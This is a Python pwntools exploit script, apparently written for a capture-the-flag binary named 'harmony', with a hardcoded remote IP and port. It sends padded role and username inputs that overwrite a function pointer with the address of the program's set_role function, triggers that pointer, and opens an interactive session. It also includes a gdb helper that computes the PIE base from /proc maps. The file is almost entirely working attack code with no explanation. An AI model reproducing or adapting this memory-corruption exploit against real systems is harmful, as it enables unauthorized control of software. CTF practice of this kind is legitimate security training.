from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './harmony'
HOST = '193.57.159.27'
PORT = 61229

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x161c])

def readch(ch):
	r.sendlineafter('> ', '0')
	r.sendlineafter('> ', str(ch))
def view():
	r.sendlineafter('> ', '1')

def chrole(name):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', name)

def chusername(name):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', name)

chrole('A'*0x26)
chusername('B'*0x20+p64(elf.sym.set_role).strip('\x00'))

r.sendlineafter('> ', '3')
readch(2)


r.interactive()
r.close()
